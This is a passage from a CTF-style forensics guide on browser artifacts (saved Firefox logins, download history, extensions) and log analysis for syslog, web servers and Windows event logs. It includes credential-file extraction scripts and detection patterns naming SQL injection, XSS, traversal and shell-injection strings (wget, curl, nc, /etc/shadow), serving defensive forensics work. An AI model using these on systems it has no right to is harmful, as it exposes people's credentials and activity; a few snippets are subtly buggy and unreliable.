**Extract Firefox saved passwords:**

```bash
# Firefox stores encrypted passwords in logins.json
cat ~/.mozilla/firefox/profile.default/logins.json | python3 -m json.tool

# Structure: contains encrypted login data
python3 << 'EOF'
import json
import os

logins_path = os.path.expanduser('~/.mozilla/firefox/profile.default/logins.json')

if os.path.exists(logins_path):
    with open(logins_path, 'r') as f:
        logins_data = json.load(f)
    
    print("Firefox Saved Logins:")
    print("=" * 80)
    
    # logins_data contains encrypted entries (requires system key for decryption)
    for entry in logins_data.get('logins', []):
        print(f"Hostname: {entry.get('hostname')}")
        print(f"Username: {entry.get('usernameField')}")
        print(f"Password Field: {entry.get('passwordField')}")
        print(f"Encrypted Username: {entry.get('encryptedUsername')[:50]}...")
        print(f"Encrypted Password: {entry.get('encryptedPassword')[:50]}...")
        print(f"Time Created: {entry.get('timeCreated')}")
        print(f"Time Password Changed: {entry.get('timePasswordChanged')}")
        print()
EOF

# [Unverified] Decryption requires access to Firefox's master password
# or system keyring where key is stored
```

---

## Download History

Browser download history reveals files accessed, malware downloads, and user activity patterns. Download logs often persist after files are deleted.

### Download History Locations

**Locate download history files:**

```bash
# Chrome downloads (SQLite)
~/.config/google-chrome/Default/History

# Firefox downloads
~/.mozilla/firefox/profile.default/places.sqlite

# Safari downloads
~/Library/Safari/History.db

# Download directories
~/Downloads/
~/Desktop/

# Check system download logs
~/.local/share/recently-used.xbel  # Linux recent files
```

### Chrome Download Analysis

**Query Chrome download history:**

```bash
sqlite3 ~/.config/google-chrome/Default/History

.schema downloads
# Fields: id, guid, current_path, target_path, start_time, received_bytes, 
#         total_bytes, state, danger_type, interrupt_reason, hash, end_time, opened

# Query all downloads
SELECT target_path, start_time, received_bytes, total_bytes, state 
FROM downloads 
ORDER BY start_time DESC 
LIMIT 50;

# Identify dangerous downloads (state = 4 indicates completed)
SELECT target_path, danger_type, state, start_time 
FROM downloads 
WHERE danger_type != 0 OR state != 4;
```

**Analyze download activity timeline:**

```bash
python3 << 'EOF'
import sqlite3
import os
from datetime import datetime

chrome_history = os.path.expanduser('~/.config/google-chrome/Default/History')

def chrome_timestamp_to_datetime(timestamp):
    epoch_diff = 11644473600
    unix_timestamp = (timestamp / 1000000) - epoch_diff
    return datetime.utcfromtimestamp(unix_timestamp)

conn = sqlite3.connect(chrome_history)
cursor = conn.cursor()

# Query downloads with timestamps
cursor.execute('''
    SELECT target_path, start_time, end_time, received_bytes, total_bytes, state
    FROM downloads
    ORDER BY start_time DESC
    LIMIT 50
''')

print("Chrome Download History:")
print("=" * 80)

for row in cursor.fetchall():
    path, start, end, received, total, state = row
    
    start_dt = chrome_timestamp_to_datetime(start) if start else None
    end_dt = chrome_timestamp_to_datetime(end) if end else None
    
    states = {1: "In Progress", 2: "Complete", 3: "Cancelled", 4: "Interrupted"}
    state_str = states.get(state, "Unknown")
    
    print(f"File: {path}")
    print(f"  Start: {start_dt}")
    print(f"  End: {end_dt}")
    print(f"  Downloaded: {received} / {total} bytes")
    print(f"  Status: {state_str}")
    print()

conn.close()
EOF
```

### Firefox Download History

**Query Firefox downloads:**

```bash
sqlite3 ~/.mozilla/firefox/profile.default/places.sqlite

.schema moz_annos
# Annotations table stores download metadata

# Query downloads (stored as annotations)
SELECT 
    h.url,
    h.title,
    a.content,
    h.visit_date
FROM moz_historyvisits h
JOIN moz_anno_attributes maa ON 1=1
WHERE h.url LIKE 'file://%'
LIMIT 30;

# Alternative: Examine download manager database
sqlite3 ~/.mozilla/firefox/profile.default/downloads.sqlite

SELECT * FROM moz_downloads;
```

### System-Level Download Analysis

**Examine system download artifacts:**

```bash
# Recent files database (Linux)
cat ~/.local/share/recently-used.xbel | grep -o '<recent>.*</recent>' | head -20

# Parse XML for download information
python3 << 'EOF'
import xml.etree.ElementTree as ET
import os

recent_file = os.path.expanduser('~/.local/share/recently-used.xbel')

if os.path.exists(recent_file):
    tree = ET.parse(recent_file)
    root = tree.getroot()
    
    print("Recent Files (Downloads):")
    print("=" * 80)
    
    for item in root.findall('{http://freedesktop.org/recent-files}RecentItem')[:30]:
        href = item.find('{http://freedesktop.org/recent-files}URI')
        modified = item.find('{http://freedesktop.org/recent-files}Modified')
        
        if href is not None:
            uri = href.text
            if '/home' in uri or 'Downloads' in uri or 'Desktop' in uri:
                print(f"File: {uri}")
                if modified is not None:
                    print(f"  Modified: {modified.text}")
                print()
EOF
```

---

## Browser Extension Artifacts

Browser extensions run with elevated privileges and can access browsing data, modify web content, and interact with system APIs. Extension artifacts reveal malicious extensions, tracking, and potential compromises.

### Extension Locations

**Locate browser extensions:**

```bash
# Chrome extensions (directory-based)
~/.config/google-chrome/Default/Extensions/

# Firefox extensions
~/.mozilla/firefox/profile.default/extensions.json
~/.mozilla/firefox/profile.default/extensions/

# Safari extensions (macOS)
~/Library/Safari/Extensions/
~/Library/Safari/Extension State/

# Chromium-based browsers
~/.config/microsoft-edge-dev/Default/Extensions/
~/.config/BraveSoftware/Brave-Browser/Default/Extensions/

# Find all extensions
find ~/ -type d -name "Extensions" 2>/dev/null
```

### Chrome Extension Analysis

**Examine installed Chrome extensions:**

```bash
# List extensions
ls -la ~/.config/google-chrome/Default/Extensions/

# Each extension has a directory named with its ID
# Directory structure: /extension_id/version/

# Extract extension metadata
cat ~/.config/google-chrome/Default/Preferences | python3 -m json.tool | grep -A 20 "extensions"

# Extension permissions and configuration
python3 << 'EOF'
import json
import os
import re

extensions_dir = os.path.expanduser('~/.config/google-chrome/Default/Extensions')

print("Chrome Extensions Analysis:")
print("=" * 80)

for ext_id in os.listdir(extensions_dir):
    ext_path = os.path.join(extensions_dir, ext_id)
    
    # Typically one version directory
    for version in os.listdir(ext_path):
        version_path = os.path.join(ext_path, version)
        
        # Read manifest.json
        manifest_path = os.path.join(version_path, 'manifest.json')
        if os.path.exists(manifest_path):
            try:
                with open(manifest_path, 'r') as f:
                    manifest = json.load(f)
                
                print(f"\nExtension ID: {ext_id}")
                print(f"  Name: {manifest.get('name')}")
                print(f"  Version: {manifest.get('version')}")
                print(f"  Description: {manifest.get('description', 'N/A')[:100]}")
                
                # Extract permissions
                if 'permissions' in manifest:
                    print(f"  Permissions: {', '.join(manifest['permissions'][:5])}")
                
                # Check for suspicious content scripts
                if 'content_scripts' in manifest:
                    print(f"  Content Scripts: {len(manifest['content_scripts'])} found")
                    for script in manifest['content_scripts']:
                        print(f"    - Matches: {script.get('matches')[:2]}")
                
                # Look for suspicious API calls
                background_path = os.path.join(version_path, manifest.get('background', {}).get('scripts', [''])[0])
                if os.path.exists(background_path):
                    with open(background_path, 'r') as f:
                        code = f.read()
                        if 'fetch' in code or 'XMLHttpRequest' in code or 'webRequest' in code:
                            print(f"  [!] Network API calls detected in background script")
            
            except Exception as e:
                print(f"Error reading {manifest_path}: {e}")
EOF
```

**Identify malicious extensions:**

```bash
# Check for extensions with suspicious permissions
python3 << 'EOF'
import json
import os

suspicious_permissions = [
    'tabs', 'history', 'downloads', 'storage', 'cookies',
    'webRequest', 'webRequestBlocking', '<all_urls>', '*://*/*'
]

extensions_dir = os.path.expanduser('~/.config/google-chrome/Default/Extensions')

print("Extensions with Suspicious Permissions:")
print("=" * 80)

for ext_id in os.listdir(extensions_dir):
    ext_path = os.path.join(extensions_dir, ext_id)
    
    for version in os.listdir(ext_path):
        manifest_path = os.path.join(ext_path, version, 'manifest.json')
        
        if os.path.exists(manifest_path):
            try:
                with open(manifest_path, 'r') as f:
                    manifest = json.load(f)
                
                permissions = manifest.get('permissions', [])
                
                # Check for suspicious permissions
                risky_perms = [p for p in permissions if p in suspicious_permissions]
                
                if risky_perms:
                    print(f"{manifest.get('name')} ({ext_id})")
                    print(f"  Suspicious permissions: {risky_perms}")
            except:
                pass
EOF
```

### Firefox Extension Analysis

**Examine Firefox extensions:**

```bash
# List extensions in extensions.json
cat ~/.mozilla/firefox/profile.default/extensions.json | python3 -m json.tool | head -100

# Parse extensions.json programmatically
python3 << 'EOF'
import json
import os

extensions_file = os.path.expanduser('~/.mozilla/firefox/profile.default/extensions.json')

if os.path.exists(extensions_file):
    with open(extensions_file, 'r') as f:
        data = json.load(f)
    
    print("Firefox Extensions:")
    print("=" * 80)
    
    for addon in data.get('addons', []):
        if addon.get('active'):
            print(f"\nName: {addon.get('name')}")
            print(f"  ID: {addon.get('id')}")
            print(f"  Version: {addon.get('version')}")
            print(f"  Type: {addon.get('type')}")
            print(f"  Install Date: {addon.get('installDate')}")
            print(f"  Update Date: {addon.get('updateDate')}")
            
            # Check permissions
            if addon.get('permissions'):
                print(f"  Permissions: {addon['permissions'][:3]}")
EOF
```

### Extension Storage and Data

**Extract extension-stored data:**

```bash
# Chrome extensions can store data in local storage
find ~/.config/google-chrome/Default -path "*Extensions*" -name "leveldb" 2>/dev/null

# Analyze extension storage
python3 << 'EOF'
import os
import json
import re

# Search for extension storage
for root, dirs, files in os.walk(os.path.expanduser('~/.config/google-chrome/Default/Extensions')):
    for file in files:
        if file.endswith('.json'):
            filepath = os.path.join(root, file)
            
            # Skip manifest files (already analyzed)
            if 'manifest' in file:
                continue
            
            try:
                with open(filepath, 'r') as f:
                    data = json.load(f)
                
                # Check for stored configuration or credentials
                if isinstance(data, dict) and len(data) > 0:
                    ext_name = filepath.split('/')[-4]  # Extension ID
                    print(f"Extension {ext_name} storage data:")
                    print(json.dumps(data, indent=2)[:300])
                    print()
            except:
                pass
EOF
```

### Extension Network Activity

**Detect malicious extension communication:**

```bash
# Check extension manifests for background scripts
python3 << 'EOF'
import json
import os
import re

extensions_dir = os.path.expanduser('~/.config/google-chrome/Default/Extensions')

print("Extension Network Communication Analysis:")
print("=" * 80)

for ext_id in os.listdir(extensions_dir):
    ext_path = os.path.join(extensions_dir, ext_id)
    
    for version in os.listdir(ext_path):
        version_path = os.path.join(ext_path, version)
        manifest_path = os.path.join(version_path, 'manifest.json')
        
        if os.path.exists(manifest_path):
            try:
                with open(manifest_path, 'r') as f:
                    manifest = json.load(f)
                
                # Check for background script
                background_scripts = manifest.get('background', {}).get('scripts', [])
                
                for script_name in background_scripts:
                    script_path = os.path.join(version_path, script_name)
                    
                    if os.path.exists(script_path):
                        with open(script_path, 'r', encoding='utf-8', errors='ignore') as f:
                            code = f.read()
                        
                        # Search for URLs and network API calls
                        urls = re.findall(r'http[s]?://[^\s"\'<>]+', code)
                        
                        if urls or 'fetch' in code or 'XMLHttpRequest' in code:
                            print(f"\n{manifest.get('name')} ({ext_id})")
                            
                            if urls:
                                print(f"  URLs found:")
                                for url in set(urls)[:5]:
                                    print(f"    - {url}")
                            
                            if 'fetch' in code:
                                print(f"  [!] Uses fetch() API")
                            if 'XMLHttpRequest' in code:
                                print(f"  [!] Uses XMLHttpRequest API")
            except Exception as e:
                pass
EOF
```

### Extension Metadata and Timeline

**Extract extension installation and update history:**

```bash
python3 << 'EOF'
import os
from datetime import datetime

extensions_dir = os.path.expanduser('~/.config/google-chrome/Default/Extensions')

print("Extension Timeline:")
print("=" * 80)

for ext_id in os.listdir(extensions_dir):
    ext_path = os.path.join(extensions_dir, ext_id)
    
    # Get directory modification time (approximate installation time)
    mtime = os.path.getmtime(ext_path)
    install_dt = datetime.fromtimestamp(mtime)
    
    for version in os.listdir(ext_path):
        version_path = os.path.join(ext_path, version)
        manifest_path = os.path.join(version_path, 'manifest.json')
        
        if os.path.exists(manifest_path):
            version_mtime = os.path.getmtime(version_path)
            version_dt = datetime.fromtimestamp(version_mtime)
            
            print(f"Extension: {ext_id}")
            print(f"  Installed: {install_dt}")
            print(f"  Version: {version}")
            print(f"  Updated: {version_dt}")
            print()
EOF
```

---

## CTF Workflow: Comprehensive Web and Browser Forensics

**Recommended analysis sequence:**

1. **Acquire browser profile directories** (all browsers in use)
2. **Analyze browser history** (Chrome and Firefox) to establish timeline of visited sites
3. **Extract cookies** to identify authentication tokens and session data
4. **Examine cache** for recoverable HTML, JavaScript, and images from visited sites
5. **Query local storage and session storage** for application-specific data and flags
6. **Analyze form autofill** for usernames, email addresses, and user identity
7. **Review download history** for suspicious files or automated downloads
8. **Inspect browser extensions** for malicious code, tracking, or data exfiltration
9. **Recover deleted entries** from SQLite database free space and LevelDB files
10. **Correlate findings** across all data sources for comprehensive timeline

**Evidence collection best practices:**

```bash
# Acquire browser profiles while browser is closed
tar -czf /tmp/chrome_profile_backup.tar.gz ~/.config/google-chrome/
tar -czf /tmp/firefox_profile_backup.tar.gz ~/.mozilla/firefox/

# Calculate hashes for chain of custody
sha256sum /tmp/chrome_profile_backup.tar.gz > /tmp/forensic_hashes.txt
sha256sum /tmp/firefox_profile_backup.tar.gz >> /tmp/forensic_hashes.txt

# Document analysis timeline
echo "Browser forensics analysis started: $(date)" >> /tmp/analysis_log.txt

# Export key findings
sqlite3 ~/.config/google-chrome/Default/History "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100;" > /tmp/chrome_urls.csv

# Memory safety: Securely handle sensitive data extracted
# Use restricted file permissions
chmod 600 /tmp/*_extracted_data
```

---

# Log Analysis

## Syslog Format Parsing

### Understanding Syslog Format

**RFC 3164 (BSD Syslog) Format:**

```
<Priority>Timestamp Hostname Process[PID]: Message

Example:
<34>Oct 12 14:23:45 webserver sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
```

**Priority Calculation:**

- Priority = Facility × 8 + Severity
- Example: <34> = Facility 4 (security) × 8 + Severity 2 (critical) = 34

**RFC 5424 (Structured Syslog) Format:**

```
<Priority>Version Timestamp Hostname Application PID MessageID StructuredData Message

Example:
<165>1 2024-10-12T14:23:45.123456+08:00 webserver sshd 12345 ID47 [exampleSDID@32473 iut="3" eventSource="Application" eventID="1011"] Failed login attempt
```

### Syslog Facility Codes

|Code|Facility|Code|Facility|
|---|---|---|---|
|0|kernel|12|NTP|
|1|user-level|13|log audit|
|2|mail|14|log alert|
|3|system daemons|15|clock|
|4|security/auth|16-23|local0-7|

### Syslog Severity Levels

|Level|Keyword|Description|
|---|---|---|
|0|emerg|System unusable|
|1|alert|Action required immediately|
|2|crit|Critical conditions|
|3|err|Error conditions|
|4|warning|Warning conditions|
|5|notice|Normal but significant|
|6|info|Informational|
|7|debug|Debug-level messages|

### Parsing Syslog Files

**Basic Parsing with awk/grep**

bash

```bash
# Extract specific severity (errors and above)
awk '{
    priority = substr($1, 2, length($1)-2)
    severity = priority % 8
    if (severity <= 3) print
}' /var/log/syslog

# Extract by facility (security/auth = 4)
awk '{
    priority = substr($1, 2, length($1)-2)
    facility = int(priority / 8)
    if (facility == 4) print
}' /var/log/syslog

# Extract failed login attempts
grep "Failed password" /var/log/auth.log

# Count failed attempts by IP
grep "Failed password" /var/log/auth.log | \
    grep -oP 'from \K[\d.]+' | \
    sort | uniq -c | sort -rn
```

**Python Syslog Parser**

python

```python
#!/usr/bin/env python3
# syslog_parser.py

import re
from datetime import datetime
from collections import defaultdict

class SyslogParser:
    # RFC 3164 pattern
    BSD_PATTERN = re.compile(
        r'^<(\d+)>(\w{3}\s+\d+\s+\d+:\d+:\d+)\s+(\S+)\s+(\S+?)(\[\d+\])?:\s+(.*)$'
    )
    
    # RFC 5424 pattern
    RFC5424_PATTERN = re.compile(
        r'^<(\d+)>(\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.*)$'
    )
    
    FACILITIES = {
        0: 'kern', 1: 'user', 2: 'mail', 3: 'daemon',
        4: 'auth', 5: 'syslog', 6: 'lpr', 7: 'news',
        8: 'uucp', 9: 'cron', 10: 'authpriv', 11: 'ftp',
        12: 'ntp', 13: 'audit', 14: 'alert', 15: 'clock',
        16: 'local0', 17: 'local1', 18: 'local2', 19: 'local3',
        20: 'local4', 21: 'local5', 22: 'local6', 23: 'local7'
    }
    
    SEVERITIES = {
        0: 'emerg', 1: 'alert', 2: 'crit', 3: 'err',
        4: 'warning', 5: 'notice', 6: 'info', 7: 'debug'
    }
    
    def parse_priority(self, priority):
        """Extract facility and severity from priority"""
        priority = int(priority)
        facility = priority // 8
        severity = priority % 8
        return {
            'facility': self.FACILITIES.get(facility, f'unknown({facility})'),
            'severity': self.SEVERITIES.get(severity, f'unknown({severity})'),
            'facility_code': facility,
            'severity_code': severity
        }
    
    def parse_line(self, line):
        """Parse a syslog line (supports both formats)"""
        
        # Try RFC 5424 first
        match = self.RFC5424_PATTERN.match(line)
        if match:
            priority, version, timestamp, hostname, app, pid, msgid, sd, message = match.groups()
            pri_info = self.parse_priority(priority)
            
            return {
                'format': 'RFC5424',
                'timestamp': timestamp,
                'hostname': hostname,
                'application': app,
                'pid': pid,
                'message_id': msgid,
                'structured_data': sd,
                'message': message,
                **pri_info
            }
        
        # Try BSD format
        match = self.BSD_PATTERN.match(line)
        if match:
            priority, timestamp, hostname, process, pid, message = match.groups()
            pri_info = self.parse_priority(priority)
            
            return {
                'format': 'BSD',
                'timestamp': timestamp,
                'hostname': hostname,
                'process': process,
                'pid': pid.strip('[]') if pid else None,
                'message': message,
                **pri_info
            }
        
        return None
    
    def analyze_file(self, filepath):
        """Analyze entire syslog file"""
        
        stats = {
            'total_lines': 0,
            'parsed_lines': 0,
            'by_severity': defaultdict(int),
            'by_facility': defaultdict(int),
            'by_host': defaultdict(int),
            'by_process': defaultdict(int)
        }
        
        with open(filepath, 'r', errors='ignore') as f:
            for line in f:
                stats['total_lines'] += 1
                
                parsed = self.parse_line(line.strip())
                if parsed:
                    stats['parsed_lines'] += 1
                    stats['by_severity'][parsed['severity']] += 1
                    stats['by_facility'][parsed['facility']] += 1
                    stats['by_host'][parsed['hostname']] += 1
                    
                    if 'process' in parsed:
                        stats['by_process'][parsed['process']] += 1
        
        return stats

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: syslog_parser.py <logfile>")
        sys.exit(1)
    
    parser = SyslogParser()
    stats = parser.analyze_file(sys.argv[1])
    
    print(f"Total lines: {stats['total_lines']}")
    print(f"Parsed lines: {stats['parsed_lines']}\n")
    
    print("Top 10 Severities:")
    for severity, count in sorted(stats['by_severity'].items(), 
                                  key=lambda x: x[1], reverse=True)[:10]:
        print(f"  {severity:10s}: {count}")
    
    print("\nTop 10 Facilities:")
    for facility, count in sorted(stats['by_facility'].items(), 
                                  key=lambda x: x[1], reverse=True)[:10]:
        print(f"  {facility:10s}: {count}")
    
    print("\nTop 10 Processes:")
    for process, count in sorted(stats['by_process'].items(), 
                                 key=lambda x: x[1], reverse=True)[:10]:
        print(f"  {process:20s}: {count}")
```

### Syslog Analysis Commands

bash

```bash
# Extract error messages with context
grep -i "error\|crit\|alert\|emerg" /var/log/syslog | tail -50

# Timeline of specific service
grep "nginx" /var/log/syslog | less

# Find log entries in time range
awk '/Oct 12 14:00/,/Oct 12 15:00/' /var/log/syslog

# Extract unique hostnames
awk '{print $4}' /var/log/syslog | sort -u

# Most active processes
awk '{print $5}' /var/log/syslog | cut -d'[' -f1 | sort | uniq -c | sort -rn | head

# Detect log gaps (missing timestamps)
awk '{print $1, $2, $3}' /var/log/syslog | uniq -c | awk '$1 < 5 {print "Gap at:", $2, $3, $4}'
```

## Apache/Nginx Access Logs

### Apache Common Log Format (CLF)

**Format:**

```
RemoteHost ident authuser [timestamp] "request" status bytes

Example:
192.168.1.50 - - [12/Oct/2024:14:23:45 +0800] "GET /admin/login.php HTTP/1.1" 200 1234
```

### Apache Combined Log Format

**Format:**

```
CLF + "Referer" "User-Agent"

Example:
192.168.1.50 - - [12/Oct/2024:14:23:45 +0800] "GET /admin/login.php HTTP/1.1" 200 1234 "http://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

### Nginx Default Format

```
log_format combined '$remote_addr - $remote_user [$time_local] '
                    '"$request" $status $body_bytes_sent '
                    '"$http_referer" "$http_user_agent"';
```

### Parsing Access Logs

**Basic Analysis Commands**

bash

```bash
# Count requests by IP
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# Extract 404 errors
awk '$9 == 404' /var/log/nginx/access.log

# Count HTTP status codes
awk '{print $9}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# Find POST requests
grep "POST" /var/log/nginx/access.log

# Extract specific URL patterns
grep -oP 'GET \K[^ ]+' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# Bandwidth analysis (bytes sent)
awk '{sum+=$10} END {print sum/1024/1024 " MB"}' /var/log/nginx/access.log

# Requests per hour
awk '{print substr($4, 14, 2)}' /var/log/apache2/access.log | sort | uniq -c

# User-Agent analysis
awk -F'"' '{print $6}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head
```

**Advanced Apache Log Parser**

python

```python
#!/usr/bin/env python3
# apache_log_parser.py

import re
from datetime import datetime
from collections import defaultdict, Counter
from urllib.parse import urlparse, parse_qs

class ApacheLogParser:
    # Combined log format pattern
    PATTERN = re.compile(
        r'(\S+)\s+'          # IP
        r'(\S+)\s+'          # ident
        r'(\S+)\s+'          # authuser
        r'\[([^\]]+)\]\s+'   # timestamp
        r'"([^"]*)"\s+'      # request
        r'(\d+)\s+'          # status
        r'(\S+)\s+'          # bytes
        r'"([^"]*)"\s+'      # referer
        r'"([^"]*)"'         # user-agent
    )
    
    def parse_line(self, line):
        """Parse single access log line"""
        match = self.PATTERN.match(line)
        if not match:
            return None
        
        ip, ident, user, timestamp, request, status, bytes_sent, referer, ua = match.groups()
        
        # Parse request
        request_parts = request.split()
        method = request_parts[0] if len(request_parts) > 0 else '-'
        path = request_parts[1] if len(request_parts) > 1 else '-'
        protocol = request_parts[2] if len(request_parts) > 2 else '-'
        
        # Parse URL
        parsed_url = urlparse(path)
        query_params = parse_qs(parsed_url.query)
        
        return {
            'ip': ip,
            'user': user if user != '-' else None,
            'timestamp': timestamp,
            'method': method,
            'path': parsed_url.path,
            'query': parsed_url.query,
            'query_params': query_params,
            'protocol': protocol,
            'status': int(status),
            'bytes': int(bytes_sent) if bytes_sent.isdigit() else 0,
            'referer': referer if referer != '-' else None,
            'user_agent': ua if ua != '-' else None
        }
    
    def detect_attacks(self, parsed_log):
        """Detect potential attack patterns"""
        alerts = []
        
        path = parsed_log['path'].lower()
        query = parsed_log.get('query', '').lower()
        
        # SQL Injection patterns
        if any(pattern in path or pattern in query for pattern in 
               ['union+select', 'or+1=1', 'or+1%3d1', "'; drop", 'exec(', 'concat(']):
            alerts.append('SQL_INJECTION')
        
        # XSS patterns
        if any(pattern in path or pattern in query for pattern in 
               ['<script', 'javascript:', 'onerror=', 'onload=', 'alert(']):
            alerts.append('XSS')
        
        # Path traversal
        if '../' in path or '..%2f' in path.lower():
            alerts.append('PATH_TRAVERSAL')
        
        # Command injection
        if any(pattern in query for pattern in 
               ['|', ';', '`', '$(', '&&', '||']):
            alerts.append('COMMAND_INJECTION')
        
        # Sensitive file access attempts
        sensitive_files = ['/etc/passwd', '/etc/shadow', '/.env', '/config', 
                          '/web.config', '/.git', '/.svn', '/backup']
        if any(sf in path for sf in sensitive_files):
            alerts.append('SENSITIVE_FILE_ACCESS')
        
        # Brute force (track separately)
        if parsed_log['status'] == 401 or 'login' in path or 'admin' in path:
            alerts.append('AUTH_ATTEMPT')
        
        return alerts
    
    def analyze_file(self, filepath):
        """Comprehensive log analysis"""
        
        stats = {
            'total_requests': 0,
            'unique_ips': set(),
            'status_codes': Counter(),
            'methods': Counter(),
            'top_paths': Counter(),
            'attacks': defaultdict(list),
            'user_agents': Counter(),
            'bandwidth': 0,
            'errors': []
        }
        
        # Track auth attempts per IP
        auth_attempts = defaultdict(list)
        
        with open(filepath, 'r', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                parsed = self.parse_line(line.strip())
                if not parsed:
                    stats['errors'].append(f"Line {line_num}: Parse error")
                    continue
                
                stats['total_requests'] += 1
                stats['unique_ips'].add(parsed['ip'])
                stats['status_codes'][parsed['status']] += 1
                stats['methods'][parsed['method']] += 1
                stats['top_paths'][parsed['path']] += 1
                stats['user_agents'][parsed['user_agent']] += 1
                stats['bandwidth'] += parsed['bytes']
                
                # Detect attacks
                alerts = self.detect_attacks(parsed)
                for alert in alerts:
                    stats['attacks'][alert].append({
                        'ip': parsed['ip'],
                        'path': parsed['path'],
                        'timestamp': parsed['timestamp']
                    })
                
                # Track auth attempts
                if 'AUTH_ATTEMPT' in alerts:
                    auth_attempts[parsed['ip']].append(parsed['timestamp'])
        
        # Detect brute force (>10 attempts from same IP)
        for ip, attempts in auth_attempts.items():
            if len(attempts) > 10:
                stats['attacks']['BRUTE_FORCE'].append({
                    'ip': ip,
                    'attempt_count': len(attempts),
                    'timestamps': attempts
                })
        
        stats['unique_ips'] = len(stats['unique_ips'])
        stats['bandwidth_mb'] = stats['bandwidth'] / (1024 * 1024)
        
        return stats

if __name__ == '__main__':
    import sys
    import json
    
    if len(sys.argv) < 2:
        print("Usage: apache_log_parser.py <access.log>")
        sys.exit(1)
    
    parser = ApacheLogParser()
    stats = parser.analyze_file(sys.argv[1])
    
    print(f"Total Requests: {stats['total_requests']}")
    print(f"Unique IPs: {stats['unique_ips']}")
    print(f"Bandwidth: {stats['bandwidth_mb']:.2f} MB\n")
    
    print("Status Codes:")
    for status, count in stats['status_codes'].most_common(10):
        print(f"  {status}: {count}")
    
    print("\nTop 10 Paths:")
    for path, count in stats['top_paths'].most_common(10):
        print(f"  {count:6d} {path}")
    
    print("\nSecurity Alerts:")
    for attack_type, incidents in stats['attacks'].items():
        print(f"  {attack_type}: {len(incidents)} incidents")
        if attack_type == 'BRUTE_FORCE':
            for incident in incidents[:5]:
                print(f"    IP: {incident['ip']} ({incident['attempt_count']} attempts)")
        else:
            for incident in incidents[:5]:
                print(f"    {incident['ip']} -> {incident['path']}")
```

### Nginx-Specific Analysis

bash

```bash
# Parse JSON formatted logs (if configured)
# nginx config: log_format json escape=json '{"time":"$time_iso8601",...}';

jq -r '.remote_addr' /var/log/nginx/access.log

# Extract slow requests (>5s response time)
# Requires $request_time in log format
awk '$NF > 5 {print $0}' /var/log/nginx/access.log

# GeoIP analysis (if geoip module enabled)
# $geoip_country_code in logs
awk '{print $X}' /var/log/nginx/access.log | sort | uniq -c | sort -rn

# Detect suspicious user agents
awk -F'"' '$6 ~ /nikto|sqlmap|nmap|masscan|scanner/ {print $1, $6}' /var/log/nginx/access.log
```

### Web Attack Detection Patterns

bash

```bash
# SQL Injection attempts
grep -iE "union.*select|concat.*\(|exec.*\(|or.*1.*=.*1" /var/log/apache2/access.log

# XSS attempts
grep -iE "<script|javascript:|onerror=|onload=" /var/log/nginx/access.log

# Directory traversal
grep -E "\.\./|\.\.%2[fF]|\.\.%5[cC]" /var/log/apache2/access.log

# Shell injection
grep -E ";\s*(cat|ls|wget|curl|nc|bash|sh)\s" /var/log/nginx/access.log

# File upload attacks
grep -iE "\.php[0-9]?|\.phtml|\.asp|\.jsp" /var/log/apache2/access.log | grep -i "upload\|temp"

# Scanners and enumeration tools
grep -iE "nikto|sqlmap|nmap|burp|metasploit|acunetix|nessus|openvas" /var/log/nginx/access.log
```

## Windows Security/System/Application Logs

### Understanding Windows Event Logs

**Event Log Files:**

```
Security:     C:\Windows\System32\winevt\Logs\Security.evtx
System:       C:\Windows\System32\winevt\Logs\System.evtx
Application:  C:\Windows\System32\winevt\Logs\Application.evtx
```

### Critical Windows Event IDs

**Security Events:**

|Event ID|Description|Significance|
|---|---|---|
|4624|Successful logon|User authentication|
|4625|Failed logon|Brute force detection|
|4648|Logon with explicit credentials|runas, Pass-the-Hash|
|4672|Special privileges assigned|Admin access|
|4688|Process creation|Command execution|
|4697|Service installed|Persistence|
|4698|Scheduled task created|Persistence|
|4720|User account created|Account manipulation|
|4732|User added to local group|Privilege escalation|
|4769|Kerberos service ticket|Lateral movement|

**System Events:**

|Event ID|Description|
|---|---|
|7045|Service installed|
|7036|Service started/stopped|
|1074|System shutdown|
|6005/6006|Event Log started/stopped|
|104|Log cleared (tampering)|

### Parsing EVTX Files (Linux)

**python-evtx**

bash

```bash
# Install
pip install python-evtx

# Convert EVTX to XML
evtx_dump.py Security.evtx > security.xml

# Extract specific event IDs
evtx_dump.py Security.evtx | grep -A 20 "EventID>4624"

# Convert to JSON
python3 << 'EOF'
import Evtx.Evtx as evtx
import json

with evtx.Evtx("Security.evtx") as log:
    for record in log.records():
        print(json.dumps({
            'event_id': record.event_id(),
            'timestamp': str(record.timestamp()),
            'xml': record.xml()
        }))
EOF
```

**plaso/log2timeline (Timeline Analysis)**

bash

```bash
# Install
apt-get install plaso-tools

# Extract timeline from EVTX
log2timeline.py timeline.plaso Security.evtx System.evtx Application.evtx

# Query timeline
psort.py -o dynamic -w timeline.csv timeline.plaso

# Filter by date range
psort.py -o dynamic timeline.plaso "date > '2024-10-01' AND date < '2024-10-15'"

# Search for specific event
pinfo.py timeline.plaso | grep "4624"
```

**evtxexport (libevtx)**

bash

```bash
# Install libevtx
apt-get install libevtx-utils

# Export to text
evtxexport -f text Security.evtx > security.txt

# Export to XML
evtxexport -f xml Security.evtx > security.xml

# Export specific record
evtxexport -r 1234 Security.evtx
```

### Windows Event Analysis Script

python

```python
#!/usr/bin/env python3
# windows_evtx_analyzer.py

import Evtx.Evtx as evtx
import xml.etree.ElementTree as ET
from collections import defaultdict, Counter
from datetime import datetime

class WindowsEventAnalyzer:
    # Critical security events
    CRITICAL_EVENTS = {
        4624: 'Successful Logon',
        4625: 'Failed Logon',
        4648: 'Explicit Credentials',
        4672: 'Special Privileges',
        4688: 'Process Creation',
        4697: 'Service Installed',
        4698: 'Scheduled Task Created',
        4720: 'User Created',
        4732: 'User Added to Group',
        4769: 'Kerberos Ticket',
        104:  'Log Cleared'
    }
    
    # Logon types
    LOGON_TYPES = {
        2: 'Interactive',
        3: 'Network',
        4: 'Batch',
        5: 'Service',
        7: 'Unlock',
